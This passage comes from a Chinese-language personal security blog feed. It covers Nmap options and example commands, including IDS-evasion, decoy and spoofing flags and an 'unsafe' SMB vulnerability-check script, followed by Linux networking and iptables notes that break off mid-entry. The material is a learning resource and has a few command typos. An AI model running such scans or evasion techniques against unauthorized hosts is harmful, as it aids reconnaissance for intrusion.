            "content_html": "<p><span class=\"label success\">✔️来首音乐吧</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"https://music.163.com/#/song?id=30621618\"]}]'></div></div>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuMmN0by5jb20vQXJ0aWNsZS8yMDE0MTIvMzYyMTg4Lmh0bWw=\">https://www.2cto.com/Article/201412/362188.html</span></p>\n<h1 id=\"nmap-简介\"><a class=\"anchor\" href=\"#nmap-简介\">#</a> Nmap 简介</h1>\n<p>Nmap 是 Network Mapper 的简称<br />\n Nmap 是一款开源免费的网络发现（Network Discovery）和安全审计（Security Auditing）工具<br />\n 1997 年由 Fyodor 创建</p>\n<p>Nmap 四项基本功能：</p>\n<p>1. 主机发现（Host Discovery）<br />\n2. 端口扫描（Port Scanning）<br />\n3. 版本侦测（Version Detection）<br />\n4. 操作系统侦测（Operating System Detection）</p>\n<p>这四项功能之间，又存在大致的依赖关系（通常情况下的顺序关系，但特殊应用另外考虑），首先需要进行主机发现，随<br />\n后确定端口状况，然后确定端口上运行具体应用程序与版本信息，然后可以进行操作系统的侦测。而在四项基本功能的基<br />\n础上，Nmap 提供防火墙与 IDS（IntrusionDetection System, 入侵检测系统）的规避技巧，可以综合应用到四个基本功<br />\n能的各个阶段；另外 Nmap 提供强大的 NSE（Nmap Scripting Language）脚本引擎功能，脚本可以对基本功能进行补充<br />\n和扩展。</p>\n<p><span class=\"label info\">大致功能为:</span></p>\n<ol>\n<li>主机存活检测</li>\n<li>端口探测</li>\n<li>服务识别</li>\n<li>操作系统识别</li>\n<li>硬件地址检测</li>\n<li>服务版本识别</li>\n<li>漏洞扫描，使用 nmap 自带脚本</li>\n</ol>\n<h1 id=\"nmap参数详解\"><a class=\"anchor\" href=\"#nmap参数详解\">#</a> Nmap 参数详解</h1>\n<h2 id=\"nmap支持主机名ip网段的表示方式\"><a class=\"anchor\" href=\"#nmap支持主机名ip网段的表示方式\">#</a> Nmap 支持主机名，ip, 网段的表示方式</h2>\n<p>例如:blah.highon.coffee, <span class=\"exturl\" data-url=\"aHR0cDovL25hbXAub3JnLzI0\">namp.org/24</span>, 192.168.0.1;10.0.0-25.1-254</p>\n<p>-iL filename                    从文件中读取待检测的目标，文件中的表示方法支持机名，ip, 网段<br />\n - iR hostnum                     随机选取，进行扫描。如果 - iR 指定为 0, 则是无休止的扫描<br />\n --exclude host1 [, host2]        从扫描任务中需要排除的主机<br />\n --exculdefile exclude_file      排除文件中的 IP, 格式和 - iL 指定扫描文件的格式相同</p>\n<h2 id=\"0x00-主机发现\"><a class=\"anchor\" href=\"#0x00-主机发现\">#</a> 0x00 主机发现</h2>\n<p>-sL                     仅仅是显示，扫描的 IP 数目，不会进行任何扫描<br />\n - sn                     ping 扫描，即主机发现<br />\n - Pn                     不检测主机存活<br />\n - PS/PA/PU/PY [portlist]  TCP SYN Ping/TCP ACK Ping/UDP Ping 发现<br />\n - PE/PP/PM               使用 ICMP echo, timestamp and netmask 请求包发现主机<br />\n - PO [prococol list]      使用 IP 协议包探测对方主机是否开启<br />\n - n/-R                   不对 IP 进行域名反向解析 / 为所有的 IP 都进行域名的反响解析</p>\n<h2 id=\"0x01-扫描技巧\"><a class=\"anchor\" href=\"#0x01-扫描技巧\">#</a> 0x01 扫描技巧</h2>\n<p>-sS/sT/sA/sW/sM                 TCP SYN/TCP connect ()/ACK/TCP 窗口扫描 / TCP Maimon 扫描<br />\n - sU                             UDP 扫描<br />\n - sN/sF/sX                       TCP Null，FIN，and Xmas 扫描<br />\n --scanflags                     自定义 TCP 包中的 flags<br />\n-sI zombie host[:probeport]     Idlescan<br />\n-sY/sZ                          SCTP INIT/COOKIE-ECHO 扫描<br />\n - sO                             使用 IP protocol 扫描确定目标机支持的协议类型<br />\n - b “FTP relay host” 使用 FTP bounce scan</p>\n<h2 id=\"0x02-指定端口和扫描顺序\"><a class=\"anchor\" href=\"#0x02-指定端口和扫描顺序\">#</a> 0x02 指定端口和扫描顺序</h2>\n<p>-p                      特定的端口 -p80,443 或者 -p1-65535<br />\n-p U:PORT               扫描 udp 的某个端口，-p U:53<br />\n-F                      快速扫描模式，比默认的扫描端口还少<br />\n - r                      不随机扫描端口，默认是随机扫描的<br />\n --top-ports &quot;number&quot;    扫描开放概率最高的 number 个端口，出现的概率需要参考 nmap-services 文件，ubuntu 中该文件位于 /usr/share/nmap.nmap 默认扫前 1000 个<br />\n --port-ratio &quot;ratio&quot;    扫描指定频率以上的端口</p>\n<h2 id=\"0x03-服务版本识别\"><a class=\"anchor\" href=\"#0x03-服务版本识别\">#</a> 0x03 服务版本识别</h2>\n<p>-sV                             开放版本探测，可以直接使用 - A 同时打开操作系统探测和版本探测<br />\n --version-intensity &quot;level&quot;     设置版本扫描强度，强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是 7<br />\n--version-light                 打开轻量级模式，为 --version-intensity 2 的别名<br />\n --version-all                   尝试所有探测，为 --version-intensity 9 的别名<br />\n --version-trace                 显示出详细的版本侦测过程信息</p>\n<h2 id=\"0x04-脚本扫描\"><a class=\"anchor\" href=\"#0x04-脚本扫描\">#</a> 0x04 脚本扫描</h2>\n<p>-sC                             根据端口识别的服务，调用默认脚本<br />\n --script=”Lua scripts”          调用的脚本名<br />\n --script-args=n1=v1,[n2=v2]     调用的脚本传递的参数<br />\n --script-args-file=filename     使用文本传递参数<br />\n --script-trace                  显示所有发送和接收到的数据<br />\n --script-updatedb               更新脚本的数据库<br />\n --script-help=”Lua script”      显示指定脚本的帮助</p>\n<h2 id=\"0x05-os识别\"><a class=\"anchor\" href=\"#0x05-os识别\">#</a> 0x05 OS 识别</h2>\n<p>-O              启用操作系统检测，-A 来同时启用操作系统检测和版本检测<br />\n --osscan-limit  针对指定的目标进行操作系统检测 (至少需确知该主机分别有一个 open 和 closed 的端口)<br />\n--osscan-guess  推测操作系统检测结果，当 Nmap 无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap 默认进行这种匹配</p>\n<h2 id=\"0x06-防火墙ids躲避和欺骗\"><a class=\"anchor\" href=\"#0x06-防火墙ids躲避和欺骗\">#</a> 0x06 防火墙 / IDS 躲避和欺骗</h2>\n<p>-f; --mtu value                 指定使用分片、指定数据包的 MTU.<br />\n-D decoy1,decoy2,ME             使用诱饵隐蔽扫描<br />\n - S IP-ADDRESS                   源地址欺骗<br />\n - e interface                    使用指定的接口<br />\n - g/--source-port PROTNUM       使用指定源端口<br />\n --proxies url1,[url2],...       使用 HTTP 或者 SOCKS4 的代理</p>\n<p>--data-length NUM               填充随机数据让数据包长度达到 NUM<br />\n--ip-options OPTIONS            使用指定的 IP 选项来发送数据包<br />\n --ttl VALUE                     设置 IP time-to-live 域<br />\n --spoof-mac ADDR/PREFIX/VEBDOR  MAC 地址伪装<br />\n --badsum                        使用错误的 checksum 来发送数据包</p>\n<h2 id=\"0x07-输出\"><a class=\"anchor\" href=\"#0x07-输出\">#</a> 0x07 输出</h2>\n<p>-oN                     将标准输出直接写入指定的文件<br />\n - oX                     输出 xml 文件<br />\n - oS                     将所有的输出都改为大写<br />\n - oG                     输出便于通过 bash 或者 perl 处理的格式，非 xml<br />\n-oA BASENAME            可将扫描结果以标准格式、XML 格式和 Grep 格式一次性输出<br />\n - v                      提高输出信息的详细度<br />\n - d level                设置 debug 级别，最高是 9<br />\n--reason                显示端口处于带确认状态的原因<br />\n --open                  只输出端口状态为 open 的端口<br />\n --packet-trace          显示所有发送或者接收到的数据包<br />\n --iflist                显示路由信息和接口，便于调试<br />\n --log-errors            把日志等级为 errors/warings 的日志输出<br />\n --append-output         追加到指定的文件<br />\n --resume FILENAME       恢复已停止的扫描<br />\n --stylesheet PATH/URL   设置 XSL 样式表，转换 XML 输出<br />\n --webxml                从 namp.org 得到 XML 的样式<br />\n --no-sytlesheet         忽略 XML 声明的 XSL 样式表</p>\n<h2 id=\"0x08-其他选项\"><a class=\"anchor\" href=\"#0x08-其他选项\">#</a> 0x08 其他选项</h2>\n<p>-6                      开启 IPv6<br />\n-A                      OS 识别，版本探测，脚本扫描和 traceroute<br />\n--datedir DIRNAME       说明用户 Nmap 数据文件位置<br />\n --send-eth /--send-ip  使用原以太网帧发送 / 在原 IP 层发送<br />\n --privileged            假定用户具有全部权限<br />\n --unprovoleged          假定用户不具有全部权限，创建原始套接字需要 root 权限<br />\n - V                      打印版本信息<br />\n - h                      输出帮助</p>\n<h1 id=\"nmap-例子\"><a class=\"anchor\" href=\"#nmap-例子\">#</a> nmap 例子</h1>\n<p>使用 ping 检测 10.0.0.0/24 这个网段</p>\n<p><code>nmap -sP 10.0.0.0/24</code></p>\n<p>使用 SYN 的方法对全端口进行扫描，在 aggressive (4) 的时间模板下，同时对开放的端口进行端口识别</p>\n<p><code>nmap -p1-65535 -sV -sS -T4 target</code></p>\n<p>PS: -T 代表的是扫描的时候，一些控制选项 (TCP 的延迟时间，探测报文之间的间隔等) 的集合，具体的 man nmap 一下就知道了</p>\n<p>使用 SYN 扫描，在 aggressive (4) 的时间模板下，探测操作系统的类型和版本，还有显示 traceroute 的结果，结果输出较为详细</p>\n<p><code>nmap -v -sS -A -T4 target</code></p>\n<p>使用 SYN 扫描，在 insane (5) 的时间模板下，探测操作系统的类型和版本，还有显示 traceroute 的结果，结果输出较为详细</p>\n<p><code>nmap -v -sS -A -T5 target</code></p>\n<p>使用 SYN 扫描，在 insane (5) 的时间模板下，探测操作系统的类型，还有显示 traceroute 的结果，操作系统的类型，结果输出较为详细</p>\n<p><code>nmap -v -sV -O -sS -T5 target</code></p>\n<p>使用 SYN 的方法对全端口进行扫描，同时对开放的端口进行端口识别，在 aggressive (4) 的时间模板下，探测操作系统的类型还有显示 traceroute 的结果，结果输出较为详细</p>\n<p><code>nmap -v -p 1-65535 -sV -O -sS -T4 target</code></p>\n<p>用 SYN 的方法对全端口进行扫描，同时对开放的端口进行端口识别，在 insane (5) 的时间模板下，探测操作系统的类型，还有显示 traceroute 的结果，结果输出较为详细</p>\n<p><code>nmap -v -p 1-65535 -sV -O -sS -T5 target</code></p>\n<p>从文件中读取需要扫描的 IP 列表</p>\n<p><code>nmap -iL ip-address.txt</code></p>\n<p>Nmap 输出格式</p>\n<ol>\n<li>扫描的结果输出到屏幕，同时会存储一份到 grep-output.txt</li>\n</ol>\n<p><code>nmap -sV -p 139,445 -oG grep-output.txt 10.0.1.0/24</code></p>\n<ol start=\"2\">\n<li>扫描结果输出为 html</li>\n</ol>\n<p><code>nmap -sS -sV -T5 10.0.1.99 --webxml -oX - | xsltproc --output file.html</code></p>\n<p>Nmap 扫描 Netbios</p>\n<ol>\n<li>在子网中发现开放 netbios 的 IP</li>\n</ol>\n<p><code>nmap -sV -v -p139,445 10.0.0.1/24</code></p>\n<ol start=\"2\">\n<li>扫描指定 netbios 的名称</li>\n</ol>\n<p><code>nmap -sU --script nbstat.nse -p 137 target</code></p>\n<p>扫描指定的目标，同时检测相关漏洞</p>\n<p><code>nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 target</code></p>\n<p>将 nmap 的 80 端口的扫描结果，通过管道交给 nikto 进行扫描</p>\n<p><code>Nmap Nikto Scan nmap -p80 10.0.1.0/24 -oG - | nikto.pl -h -</code></p>\n<p>将 nmap 的 80,443 端口的扫描结果，通过管道交给 nikto 进行扫描</p>\n<p><code>nmap -p80,443 10.0.1.0/24 -oG - | nikto.pl -h -</code></p>\n",
            "tags": [
                "web安全",
                "Nmap"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/03/02/%E5%88%9D%E5%AD%A6webshell%E6%A3%80%E6%B5%8B/",
            "url": "https://self-ferry.github.io/2021/03/02/%E5%88%9D%E5%AD%A6webshell%E6%A3%80%E6%B5%8B/",
            "title": "初学webshell检测",
            "date_published": "2021-03-02T09:51:07.000Z",
            "content_html": "<h1 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h1>\n",
            "tags": []
        },
        {
            "id": "https://self-ferry.github.io/2021/02/26/%E5%9C%A8Android%E4%B8%8A%E5%AE%89%E8%A3%85kali/",
            "url": "https://self-ferry.github.io/2021/02/26/%E5%9C%A8Android%E4%B8%8A%E5%AE%89%E8%A3%85kali/",
            "title": "在Android上安装kali",
            "date_published": "2021-02-26T05:55:57.000Z",
            "content_html": "<h1 id=\"️正文\"><a class=\"anchor\" href=\"#️正文\">#</a> <span class=\"label success\">✔️正文</span></h1>\n<p>就不多此一举了，还是看国光大佬写的吧<br />\n链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc3Fsc2VjLmNvbS8yMDE4LzA1L3Rlcm11eC5odG1s\">https://www.sqlsec.com/2018/05/termux.html</span></p>\n",
            "tags": [
                "Android",
                "Android"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/02/19/linux%E8%BF%9B%E9%98%B6/",
            "url": "https://self-ferry.github.io/2021/02/19/linux%E8%BF%9B%E9%98%B6/",
            "title": "linux进阶学习",
            "date_published": "2021-02-19T06:54:11.000Z",
            "content_html": "<p><span class=\"label success\">✔️来首音乐吧</span></p>\n<div class=\"media-container\"><div class=\"player\" data-type=\"audio\" data-src='[{\"title\":\"列表 1\",\"list\":[\"https://music.163.com/#/song?id=555964763\"]}]'></div></div>\n<h1 id=\"网络配置\"><a class=\"anchor\" href=\"#网络配置\">#</a> 网络配置</h1>\n<h2 id=\"ifconfig-详解\"><a class=\"anchor\" href=\"#ifconfig-详解\">#</a> ifconfig 详解</h2>\n<p>ifconfig 命令可以显示或配置网络设备 (网络接口卡) , 也可以修改这些配置。<br />\n用 ifconfig 命令配置的网卡信息，在网卡重启后机器重启后，配置就不存在。要想将上述的配置信息永久保存，那就要修改网卡的配置文件了。</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>DEVICE=“ens33” 　　# 网卡名称<br />\n // UP：表示 “接口已启用”。<br />\n// BROADCAST ：表示 “主机支持广播”。<br />\n// RUNNING：表示 “接口在工作中”。<br />\n// MULTICAST：表示 “主机支持多播”。<br />\n// MTU:1500（最大传输单元）：1500 字节<br />\n //inet ：网卡的 IP 地址。<br />\n//netmask ：网络掩码。<br />\n//broadcast ：广播地址。<br />\n// 网卡的 IPv6 地址<br />\n // 连接类型：Ethernet (以太网) HWaddr (硬件 mac 地址)<br />\n//txqueuelen (网卡设置的传送队列长度)<br />\n// RX packets 接收时，正确的数据包数。<br />\n// RX bytes 接收的数据量。<br />\n// RX errors 接收时，产生错误的数据包数。<br />\n// RX dropped 接收时，丢弃的数据包数。<br />\n// RX overruns 接收时，由于速度过快而丢失的数据包数。<br />\n// RX frame 接收时，发生 frame 错误而丢失的数据包数。<br />\n// TX packets 发送时，正确的数据包数。<br />\n// TX bytes 发送的数据量。<br />\n// TX errors 发送时，产生错误的数据包数。<br />\n// TX dropped 发送时，丢弃的数据包数。<br />\n// TX overruns 发送时，由于速度过快而丢失的数据包数。<br />\n// TX carrier 发送时，发生 carrier 错误而丢失的数据包数。<br />\n//collisions 冲突信息包的数目。</p>\n<p>lo: 表示主机的回坏地址，这个一般是用来测试一个网络程序，但又不想让局域网或外网的用户能够查看，只能在此台主机上运行和查看所用的网络接口。</p>\n<p>ifconfig 的配置针对当前起作用，, 当服务器进行重启启动，配置的 IP 和掩码等信息都会丢失因为 ifconfig 的没有把配置写入到配置文件，当系统重新启动中，会重新加载网络配置文件，因此配置会丢失</p>\n<p>ifconfig 命令 参数具体见<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9saW51eC9saW51eC1jb21tLWlmY29uZmlnLmh0bWw=\"> https://www.runoob.com/linux/linux-comm-ifconfig.html</span></p>\n<h2 id=\"网络配置文件\"><a class=\"anchor\" href=\"#网络配置文件\">#</a> 网络配置文件</h2>\n<p>网络接口配置文件均存放在 /etc/sysconfig/network-scripts/ 目录下</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>root@node ~<span class=\"token punctuation\">]</span><span class=\"token comment\"># cat /etc/sysconfig/network-scripts/ifcfg-ens33 </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token assign-left variable\">TYPE</span><span class=\"token operator\">=</span>Ethernet</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token assign-left variable\">PROXY_METHOD</span><span class=\"token operator\">=</span>none</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token assign-left variable\">BROWSER_ONLY</span><span class=\"token operator\">=</span>no</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token assign-left variable\">BOOTPROTO</span><span class=\"token operator\">=</span>none</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token assign-left variable\">DEFROUTE</span><span class=\"token operator\">=</span>yes</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token assign-left variable\">IPV4_FAILURE_FATAL</span><span class=\"token operator\">=</span>no</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token assign-left variable\">IPV6INIT</span><span class=\"token operator\">=</span>yes</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token assign-left variable\">IPV6_AUTOCONF</span><span class=\"token operator\">=</span>yes</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token assign-left variable\">IPV6_DEFROUTE</span><span class=\"token operator\">=</span>yes</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token assign-left variable\">IPV6_FAILURE_FATAL</span><span class=\"token operator\">=</span>no</pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token assign-left variable\">IPV6_ADDR_GEN_MODE</span><span class=\"token operator\">=</span>stable-privacy</pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token assign-left variable\">NAME</span><span class=\"token operator\">=</span>ens33</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token assign-left variable\">UUID</span><span class=\"token operator\">=</span>3693f084-6c9a-4b4e-82ef-62377f4c3502</pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token assign-left variable\">DEVICE</span><span class=\"token operator\">=</span>ens33</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token assign-left variable\">ONBOOT</span><span class=\"token operator\">=</span>yes</pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token assign-left variable\">IPADDR</span><span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.10.100</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token assign-left variable\">PREFIX</span><span class=\"token operator\">=</span><span class=\"token number\">24</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token assign-left variable\">GATEWAY</span><span class=\"token operator\">=</span><span class=\"token number\">192.198</span>.10.1</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#################################</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>下面介绍改配置文件中的每一行的含义。</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#################################</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token assign-left variable\">DEVICE</span><span class=\"token operator\">=</span>:网卡设备名</pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token assign-left variable\">HWADDR</span><span class=\"token operator\">=</span>:网卡的物理地址</pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token assign-left variable\">TYPE</span><span class=\"token operator\">=</span>:网卡的类型</pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token assign-left variable\">UUID</span><span class=\"token operator\">=</span>:网卡的UUID</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token assign-left variable\">IPADDR</span><span class=\"token operator\">=</span>:IP地址</pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token assign-left variable\">NETMASK</span><span class=\"token operator\">=</span>:子网掩码</pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token assign-left variable\">GATEWAY</span><span class=\"token operator\">=</span>:网关</pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token assign-left variable\">DNS1</span><span class=\"token operator\">=</span>:DNS</pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token assign-left variable\">ONBOOT</span><span class=\"token operator\">=</span>:该网卡是否激活</pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token assign-left variable\">NM_CONTROLLED</span><span class=\"token operator\">=</span>:网络是否由NetworkManager进行管理</pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token assign-left variable\">BOOTPROTO</span><span class=\"token operator\">=</span>：启动远程协议为静态设置</pre></td></tr></table></figure><h2 id=\"路由的查看及配置\"><a class=\"anchor\" href=\"#路由的查看及配置\">#</a> 路由的查看及配置</h2>\n<p>路由 (route) 就是分组在因特网上从一台计算机传输到另一台计算机的实际路径。<br />\n因特网上的每个路由器都存储有一张表，称为路由表 (routing table), 路由器正是依据路由表的内容将各个 IP 分组转发到正确的去处。</p>\n<p>路由，路由器，路由表的区别:</p>\n<p>路由：既可以指计算机之间的传输路径，又可以指传输这一动态过程<br />\n路由器：设备，即完成路由这一动态过程的设备<br />\n路由表：信息，是储存在路由器中的用来路由的信息</p>\n<p>查看路由命令：<br />\n <code>netstat -r</code></p>\n<p><code>route -n</code></p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>查看本机路由信息<br />\n <code>route -n</code></p>\n<p>添加一条默认路由，临时生效 (重启后就会失效)<br />\n <code>route add default qw 192.168.10.1</code></p>\n<p>删除一条默认路由<br />\n <code>route del default gw 192.168.10.1</code></p>\n<p>添加一条静态路由，发往 192.168.8.62 这个网段的全部要经过网关 192.168.1.1<br />\n <code>route add-net 192.168.8.0 netmask 255.255.255.0 gw 192.168.1.1</code></p>\n<p>删除一条静态路由，删除的时候可以不写网关<br />\n <code>route del -net 192.168.8.0 netmask 255.255.255.0 gw 192.168.1.1</code></p>\n<p>设置包转发功能:</p>\n<p>开启 Liunx 的路由转发功能:<br />\n 编辑 /etc/sysctl.conf 设置 net.pv4.p forward=1</p>\n<p>临时配置：<br />\n <code>echo &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward</code></p>\n<h2 id=\"dns\"><a class=\"anchor\" href=\"#dns\">#</a> DNS</h2>\n<p>Linux 下查看本地的 DNS:<br />\n1.cat /etc/resolv.conf<br />\n2.nslookup <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5iYWlkdS5jb20=\">www.baidu.com</span></p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<h3 id=\"dns-查询工具\"><a class=\"anchor\" href=\"#dns-查询工具\">#</a> DNS 查询工具</h3>\n<ol>\n<li>\n<p>nslookup 是一个能够查询互联网域名服务器信息的程序。<br />\n他有两种工作模式，即 &quot;交互模式&quot; 和 &quot;非交互模式&quot;<br />\n在&quot; 交互模式 &quot; 下，用户可以向域名服务器查询各类主机、域名的信息，或者输出域名中的主机列表。<br />\n而在 “非交互模式 &quot; 下，用户可以针对一个主机或域名仅仅获取特定的名称或所需信息。</p>\n</li>\n<li>\n<p>Dig 是一个在类 Unix 命令行模式下查询 DNS 包括 NSi 录，A 记录，MX 记录等相关信息的工具。</p>\n</li>\n</ol>\n<p>dig 命令:<br />\n 查询一台主机，但是默认情况下，Dig 的输出信息很详细<br />\n最常用的查询是 A 记录，TXT (文本注释) , MXi 录，NS 记录</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<h3 id=\"dns域名解析中添加的各项解析记录\"><a class=\"anchor\" href=\"#dns域名解析中添加的各项解析记录\">#</a> DNS 域名解析中添加的各项解析记录</h3>\n<p>A 记录： 将域名指向一个 IPv4 地址（例如：100.100.100.100），需要增加 A 记录</p>\n<p>CNAME 记录： 如果将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加 CNAME 记录。这个域名一般是主机服务商提供的一个域名</p>\n<p>MX 记录： 建立电子邮箱服务，将指向邮件服务器地址，需要设置 MX 记录。建立邮箱时，一般会根据邮箱服务商提供的 MX 记录填写此记录</p>\n<p>NS 记录： 域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置 NS 记录</p>\n<p>TXT 记录： 可任意填写，可为空。一般做一些验证记录时会使用此项，如：做 SPF（反垃圾邮件）记录</p>\n<p>AAAA 记录： 将主机名（或域名）指向一个 IPv6 地址（例如：ff03:0:0:0:0:0:0:c1），需要添加 AAAA 记录</p>\n<p>SRV 记录： 添加服务记录服务器服务记录时会添加此项，SRV 记录了哪台计算机提供了哪个服务。格式为：服务的名字。协议的类型（例如：_example-server._tcp）。</p>\n<p>SOA 记录： SOA 叫做起始授权机构记录，NS 用于标识多台域名解析服务器，SOA 记录用于在众多 NS 记录中那一台是主服务器</p>\n<p>PTR 记录： PTR 记录是 A 记录的逆向记录，又称做 IP 反查记录或指针记录，负责将 IP 反向解析为域名</p>\n<p>显性 URL 转发记录： 将域名指向一个 http (s) 协议地址，访问域名时，自动跳转至目标地址。例如：将 www.liuht.cn 显性转发到 www.itbilu.com 后，访问 www.liuht.cn 时，地址栏显示的地址为：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5pdGJpbHUuY29t\">www.itbilu.com</span>。</p>\n<p>隐性 UR 转发记录 L： 将域名指向一个 http (s) 协议地址，访问域名时，自动跳转至目标地址，隐性转发会隐藏真实的目标地址。例如：将 www.liuht.cn 显性转发到 www.itbilu.com 后，访问 www.liuht.cn 时，地址栏显示的地址仍然是：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5saXVodC5jbg==\">www.liuht.cn</span>。</p>\n<p><em><strong>Reference:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmx1ZXN0b3JtL3AvMTAzNDUzMzQuaHRtbA==\">https://www.cnblogs.com/bluestorm/p/10345334.html</span></strong></em></p>\n<h1 id=\"iptables详解\"><a class=\"anchor\" href=\"#iptables详解\">#</a> iptables 详解</h1>\n<h2 id=\"防火墙类型\"><a class=\"anchor\" href=\"#防火墙类型\">#</a> 防火墙类型</h2>\n<h3 id=\"包过滤防火墙\"><a class=\"anchor\" href=\"#包过滤防火墙\">#</a> 包过滤防火墙</h3>\n<p>在 Linux 系统下，包过滤功能是内建于核心的 (作为一个核心模块，或者直接内建) , 同时还有一些可以运用于数据包之上的技巧，不过最常用的依然是查看包头以决定包的命运。包过滤防火墙将对每一个接收到的包做出允许或拒绝的决定。具体地讲，它针对每一个数据包的包头，按照包过滤规则进行判定，与规则相匹配的包依据路由信息继续转发，否则就丢弃。包过滤是在 IP 层实现的，包过滤根据数据包的源 P 地址、目的 IP 地址、协议类型 (TCP 包 UDP 包、ICMP 包)、源端口、目的端口等包头信息及数据包传输方向等信息来判断是否允许数据包通过。 包过滤也包括与服务相关的过滤，这是指基于特定的服务进行包过滤，由于绝大多数服务的监听都驻留在特定 TCP/UDP 端口，因此，为阻断所有进入特定服务的链接，防火墙只需将所有包含特定 TCP/UDP 目的端口的包丢弃即可</p>\n<h3 id=\"状态检测防火墙\"><a class=\"anchor\" href=\"#状态检测防火墙\">#</a> 状态检测防火墙</h3>\n<p>状态检测防火墙在网络层有一个检查引擎截获数据包并抽取出与应用层状态有关的信息，并以此为依据决定对该连接是接受还是拒绝。这种技术提供了高度安全的解决方案，同时具有较好的适应性和扩展性。状态检测防火墙基本保持了简单包过滤防火墙的优点，性能比较好，同时对应用是透明的，在此基础上，对于安全性有了大幅提升。这种防火墙摒弃了简单包过滤防火墙仅仅考察进出网络的数据包，不关心数据包状态的缺点，在防火墙的核心部分建立状态连接表，维护了连接，将进出网络的数据当成一个个的事件来处理。可以这样说，状态检测包过滤防火墙规范了网络层和传输层行为，而应用代理型防火墙则是规范了特定的应用协议上的行为。</p>\n<h2 id=\"iptables介绍\"><a class=\"anchor\" href=\"#iptables介绍\">#</a> iptables 介绍</h2>\n<p>netfilter/iptables (简称为 iptables) 组成 Linux 平台下的包过滤防火墙，与大多数的 Linux 软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成封包过滤、封包重定向和网络地址转换 (NAT) 等功能。</p>\n<p>其实 iptables 服务不是真正的防火墙，只是用来定义防火墙规则功能的 &quot;防火墙管理工具&quot;, 将定义好的规则交由内核中的 netfilter 即网络过滤器来读取，从而真正实现防火墙功能。</p>\n<h2 id=\"iptables基本信息\"><a class=\"anchor\" href=\"#iptables基本信息\">#</a> iptables 基本信息</h2>\n<p>规则 (rules) 其实就是网络管理员预定义的条件，规则一般的定义为 &quot;如果数据包头符合这样的条件，就这样处理这个数据包&quot;</p>\n<p>规则存储在内核空间的信息包过滤表中，这些规则分别指定了源地址、目的地址、传输协议 (如 TCP, UDP,ICMP) 和服务类型 (如 HTTP, FTP 和 SMTP) 等。</p>\n<p>当数据包与规则匹配时，iptables 就根据规则所定义的方法来处理这些数据包，如放行 (accept) 、拒绝 (reject) 和丢弃 (drop) 等。</p>\n<p>配置防火墙的主要工作就是添加、修改和删除这些规则。</p>\n<h2 id=\"表与链介绍\"><a class=\"anchor\" href=\"#表与链介绍\">#</a> 表与链介绍</h2>\n<ul>\n<li>\n<p>表 (tables) 提供特定的功能，iptables 内置了 4 个表，即 filter 表、nat 表、mangle 表和 raw 表，分别用于实现包过滤，网络地址转换、包重构 (修改) 和数据跟踪处理，这些表具有一定的优先级: 